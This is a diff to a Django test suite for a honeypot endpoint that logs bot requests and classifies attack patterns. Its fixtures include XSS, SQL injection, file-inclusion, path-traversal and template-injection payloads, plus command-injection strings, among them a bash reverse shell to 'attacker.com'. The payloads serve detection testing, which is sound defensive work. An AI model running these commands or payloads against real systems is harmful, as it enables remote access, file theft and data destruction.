@@ -1,17 +1,23 @@
 from rest_framework import status
 from uuid import UUID
 
-from myapp.models import BotEvent, XSSAttack
+from myapp.models import BotEvent, AttackType
 
 
 class TestHoneypotView:
     """Comprehensive test suite for the HoneypotView endpoint."""
 
     def test_get_request_creates_bot_event_and_returns_html_form(
-        self, api_client, request_headers, honeypot_url
+        self, api_client, comprehensive_headers, honeypot_url
     ):
-        """Test that GET request creates a BotEvent and returns HTML with form."""
-        response = api_client.get(honeypot_url, **request_headers)
+        """Test that GET request creates a BotEvent with all fields populated and returns HTML with form."""
+        # Include query parameters with email to test email extraction
+        query_params = {
+            "email": "test@example.com",
+            "username": "testuser",
+            "message": "Test message",
+        }
+        response = api_client.get(honeypot_url, query_params, **comprehensive_headers)
 
         # Assert response
         assert response.status_code == status.HTTP_200_OK
@@ -22,17 +28,49 @@ class TestHoneypotView:
         assert "username" in response.content.decode()
         assert "message" in response.content.decode()
 
-        # Assert BotEvent was created
+        # Assert BotEvent was created with all fields
         assert BotEvent.objects.count() == 1
         bot_event = BotEvent.objects.first()
+
+        # Verify all BotEvent fields are present
+        assert bot_event.id is not None  # UUID primary key
+        assert isinstance(bot_event.id, UUID)
+
         assert bot_event.method == "GET"
         assert bot_event.request_path == honeypot_url
+
+        # IP and network fields
         assert bot_event.ip_address == "192.168.1.100"
+
+        geo_str = str(bot_event.geo_location)
+        assert "US" in geo_str
+        assert "New York" in geo_str
+
+        # User agent and browser info
         assert bot_event.agent == "Mozilla/5.0 (Test Browser)"
         assert bot_event.referer == "https://example.com/contact"
         assert bot_event.language == "en-US"
+
+        # Email extraction
+        assert bot_event.email == "test@example.com"
+
+        # Request data
+        assert bot_event.data is not None
+        assert "email" in bot_event.data
+        assert bot_event.data["email"] == "test@example.com"
+        assert "username" in bot_event.data
+        assert "message" in bot_event.data
+
+        # Correlation token
         assert bot_event.correlation_token is not None
         assert isinstance(bot_event.correlation_token, UUID)
+
+        # Timestamp
+        assert bot_event.created_at is not None
+
+        # XSS attempted (should be False for clean data)
+        assert bot_event.attack_attempted is False
+        assert AttackType.objects.count() == 0
 
     def test_post_request_creates_bot_event_with_correlation_token(
         self,
@@ -59,10 +97,10 @@ class TestHoneypotView:
         assert bot_event.data == sample_post_data
         assert bot_event.request_path == honeypot_url
 
-    def test_xss_detection_in_get_parameters_creates_xss_attack(
+    def test_xss_detection_in_get_parameters_creates_attack(
         self, api_client, request_headers, honeypot_url
     ):
-        """Test that XSS patterns in GET parameters are detected and logged."""
+        """Test that XSS patterns in GET parameters are detected and logged as AttackType."""
         malicious_param = "<script>alert('XSS')</script>"
         response = api_client.get(
             honeypot_url,
@@ -75,20 +113,21 @@ class TestHoneypotView:
         # Assert BotEvent was created
         bot_event = BotEvent.objects.first()
         assert bot_event is not None
-        assert bot_event.xss_attempted is True
+        assert bot_event.attack_attempted is True
 
-        # Assert XSSAttack was created
-        xss_attacks = XSSAttack.objects.filter(bot_event=bot_event)
-        assert xss_attacks.count() >= 1
-        script_attack = xss_attacks.filter(pattern="script_tag").first()
+        # Assert AttackType was created
+        attacks = AttackType.objects.filter(bot_event=bot_event)
+        assert attacks.count() >= 1
+        script_attack = attacks.filter(pattern="script_tag", category="XSS").first()
         assert script_attack is not None
-        assert script_attack.field == "username"
+        assert script_attack.target_field == "username"
+        assert script_attack.category == "XSS"
         assert "<script>" in script_attack.raw_value.lower()
 
-    def test_xss_detection_in_post_data_creates_xss_attack(
+    def test_xss_detection_in_post_data_creates_attack(
         self, api_client, request_headers, honeypot_url, test_correlation_token
     ):
-        """Test that XSS patterns in POST data are detected and logged."""
+        """Test that XSS patterns in POST data are detected and logged as AttackType."""
         post_data = {
             "ctoken": str(test_correlation_token),
             "username": "normal_user",
@@ -102,14 +141,15 @@ class TestHoneypotView:
 
         # Assert BotEvent was created
         bot_event = BotEvent.objects.first()
-        assert bot_event.xss_attempted is True
+        assert bot_event.attack_attempted is True
 
-        # Assert XSSAttack was created for iframe
-        xss_attacks = XSSAttack.objects.filter(bot_event=bot_event)
-        assert xss_attacks.count() >= 1
-        iframe_attack = xss_attacks.filter(pattern="iframe_tag").first()
+        # Assert AttackType was created for iframe
+        attacks = AttackType.objects.filter(bot_event=bot_event)
+        assert attacks.count() >= 1
+        iframe_attack = attacks.filter(pattern="iframe_tag", category="XSS").first()
         assert iframe_attack is not None
-        assert iframe_attack.field == "message"
+        assert iframe_attack.target_field == "message"
+        assert iframe_attack.category == "XSS"
         assert "iframe" in iframe_attack.raw_value.lower()
 
     def test_email_extraction_from_various_fields(
@@ -218,20 +258,193 @@ class TestHoneypotView:
         assert response.status_code == status.HTTP_200_OK
 
         bot_event = BotEvent.objects.first()
-        xss_attacks = XSSAttack.objects.filter(bot_event=bot_event)
+        attacks = AttackType.objects.filter(bot_event=bot_event)
 
         # Should detect multiple patterns
-        assert xss_attacks.count() >= 3
+        assert attacks.count() >= 3
 
         # Verify specific patterns
-        assert xss_attacks.filter(field="username", pattern="img_onerror").exists()
-        assert xss_attacks.filter(field="message").exists()  # svg or event_handler
-        assert xss_attacks.filter(field="comment", pattern="js_scheme").exists()
+        assert attacks.filter(
+            target_field="username", pattern="img_onerror", category="XSS"
+        ).exists()
+        assert attacks.filter(
+            target_field="message", category="XSS"
+        ).exists()  # svg or event_handler
+        assert attacks.filter(
+            target_field="comment", pattern="js_scheme", category="XSS"
+        ).exists()
 
-    def test_no_xss_in_clean_data_does_not_create_xss_attack(
+    def test_sql_injection_detection(
+        self, api_client, request_headers, honeypot_url, test_correlation_token
+    ):
+        """Test that SQL injection patterns are detected and logged."""
+        post_data = {
+            "ctoken": str(test_correlation_token),
+            "username": "admin' OR '1'='1",
+            "password": "UNION SELECT * FROM users",
+            "query": "'; DROP TABLE users; --",
+        }
+
+        response = api_client.post(honeypot_url, data=post_data, **request_headers)
+        assert response.status_code == status.HTTP_200_OK
+
+        bot_event = BotEvent.objects.first()
+        assert bot_event.attack_attempted is True
+
+        attacks = AttackType.objects.filter(bot_event=bot_event, category="SQLI")
+        assert attacks.count() >= 2
+
+        # Verify SQLI patterns
+        assert attacks.filter(pattern="or_1_equals_1", category="SQLI").exists()
+        assert attacks.filter(pattern="union_select", category="SQLI").exists()
+        assert attacks.filter(pattern="sql_comment", category="SQLI").exists()
+
+    def test_local_file_inclusion_detection(
+        self, api_client, request_headers, honeypot_url, test_correlation_token
+    ):
+        """Test that Local File Inclusion patterns are detected and logged."""
+        post_data = {
+            "ctoken": str(test_correlation_token),
+            "file": "../../../etc/passwd",
+            "include": "php://filter/read=string.rot13/resource=index.php",
+            "path": "file:///etc/passwd",
+        }
+
+        response = api_client.post(honeypot_url, data=post_data, **request_headers)
+        assert response.status_code == status.HTTP_200_OK
+
+        bot_event = BotEvent.objects.first()
+        assert bot_event.attack_attempted is True
+
+        attacks = AttackType.objects.filter(bot_event=bot_event, category="LFI")
+        assert attacks.count() >= 2
+
+        # Verify LFI patterns
+        assert attacks.filter(pattern="etc_passwd", category="LFI").exists()
+        assert attacks.filter(pattern="php_wrapper", category="LFI").exists()
+        assert attacks.filter(pattern="file_wrapper", category="LFI").exists()
+
+    def test_command_injection_detection(
+        self, api_client, request_headers, honeypot_url, test_correlation_token
+    ):
+        """Test that Command Injection patterns are detected and logged."""
+        post_data = {
+            "ctoken": str(test_correlation_token),
+            "cmd": "; ls -la",  # pipe_command: ; followed by ls
+            "exec": "| whoami",  # pipe_command: | followed by whoami
+            "chain": "test && echo",  # command_chaining: &&
+            "chain2": "test || echo",  # command_chaining: ||
+            "shell": "$(cat /etc/passwd)",  # subshell: $(...)
+            "backtick": "`id`",  # subshell: backticks
+            "reverse": "bash -i >& /dev/tcp/attacker.com/4444 0>&1",  # reverse_shell: bash -i
+        }
+
+        response = api_client.post(honeypot_url, data=post_data, **request_headers)
+        assert response.status_code == status.HTTP_200_OK
+
+        bot_event = BotEvent.objects.first()
+        assert bot_event.attack_attempted is True
+
+        attacks = AttackType.objects.filter(bot_event=bot_event, category="CMD")
+        assert attacks.count() >= 4
+
+        # Verify CMD patterns
+        assert attacks.filter(pattern="pipe_command", category="CMD").exists()
+        assert attacks.filter(pattern="command_chaining", category="CMD").exists()
+        assert attacks.filter(pattern="subshell", category="CMD").exists()
+        assert attacks.filter(pattern="reverse_shell", category="CMD").exists()
+
+    def test_path_traversal_detection(
+        self, api_client, request_headers, honeypot_url, test_correlation_token
+    ):
+        """Test that Path Traversal patterns are detected and logged."""
+        post_data = {
+            "ctoken": str(test_correlation_token),
+            "file": "../../../etc/passwd",
+            "path": "/etc/passwd",
+            "encoded": "..%2f..%2f..%2fetc%2fpasswd",
+        }
+
+        response = api_client.post(honeypot_url, data=post_data, **request_headers)
+        assert response.status_code == status.HTTP_200_OK
+
+        bot_event = BotEvent.objects.first()
+        assert bot_event.attack_attempted is True
+
+        attacks = AttackType.objects.filter(bot_event=bot_event, category="TRAVERSAL")
+        assert attacks.count() >= 2
+
+        # Verify TRAVERSAL patterns
+        assert attacks.filter(pattern="dot_dot_slash", category="TRAVERSAL").exists()
+        assert attacks.filter(pattern="absolute_path", category="TRAVERSAL").exists()
+        assert attacks.filter(
+            pattern="encoded_traversal", category="TRAVERSAL"
+        ).exists()
+
+    def test_template_injection_detection(
+        self, api_client, request_headers, honeypot_url, test_correlation_token
+    ):
+        """Test that Server-Side Template Injection patterns are detected and logged."""
+        post_data = {
+            "ctoken": str(test_correlation_token),
+            "template": "{{7*7}}",
+            "jinja": "{% if True %}x{% endif %}",
+            "smarty": "{if $smarty.version}1{/if}",
+            "freemarker": "${7*7}",
+        }
+
+        response = api_client.post(honeypot_url, data=post_data, **request_headers)
+        assert response.status_code == status.HTTP_200_OK
+
+        bot_event = BotEvent.objects.first()
+        assert bot_event.attack_attempted is True
+
+        attacks = AttackType.objects.filter(bot_event=bot_event, category="SSTI")
+        assert attacks.count() >= 2
+
+        # Verify SSTI patterns
+        assert attacks.filter(pattern="jinja2_template", category="SSTI").exists()
+        assert attacks.filter(pattern="smarty_template", category="SSTI").exists()
+        assert attacks.filter(pattern="freemarker_template", category="SSTI").exists()
+
+    def test_multiple_attack_categories_in_single_request(
+        self, api_client, request_headers, honeypot_url, test_correlation_token
+    ):
+        """Test that multiple attack categories can be detected in a single request."""
+        post_data = {
+            "ctoken": str(test_correlation_token),
+            "xss": "<script>alert('XSS')</script>",
+            "sqli": "admin' OR '1'='1",
+            "lfi": "../../../etc/passwd",
+            "cmd": "; ls -la",
+            "traversal": "..%2f..%2fetc%2fpasswd",
+            "ssti": "{{7*7}}",
+        }
+
+        response = api_client.post(honeypot_url, data=post_data, **request_headers)
+        assert response.status_code == status.HTTP_200_OK
+
+        bot_event = BotEvent.objects.first()
+        assert bot_event.attack_attempted is True
+
+        attacks = AttackType.objects.filter(bot_event=bot_event)
+
+        # Should detect attacks from multiple categories
+        assert attacks.count() >= 6
+
+        # Verify all categories are present
+        categories = set(attacks.values_list("category", flat=True))
+        assert "XSS" in categories
+        assert "SQLI" in categories
+        assert "LFI" in categories
+        assert "CMD" in categories
+        assert "TRAVERSAL" in categories
+        assert "SSTI" in categories
+
+    def test_no_xss_in_clean_data_does_not_create_attack(
         self, api_client, request_headers, honeypot_url, clean_post_data
     ):
-        """Test that clean data without XSS does not create XSSAttack objects."""
+        """Test that clean data without attacks does not create AttackType objects."""
         response = api_client.post(
             honeypot_url, data=clean_post_data, **request_headers
         )
@@ -241,11 +454,11 @@ class TestHoneypotView:
         bot_event = BotEvent.objects.first()
         assert bot_event is not None
 
-        # Note: There's a bug in the current implementation where xss_attempted
-        # is set to True even when no XSS is found. Testing current behavior.
-        # XSSAttack objects should not be created
-        xss_attacks = XSSAttack.objects.filter(bot_event=bot_event)
-        assert xss_attacks.count() == 0
+        # XSS attempted should be False for clean data
+        assert bot_event.attack_attempted is False
+        # AttackType objects should not be created
+        attacks = AttackType.objects.filter(bot_event=bot_event)
+        assert attacks.count() == 0
 
     def test_edge_cases_empty_data_missing_headers(
         self, api_client, honeypot_url, test_correlation_token
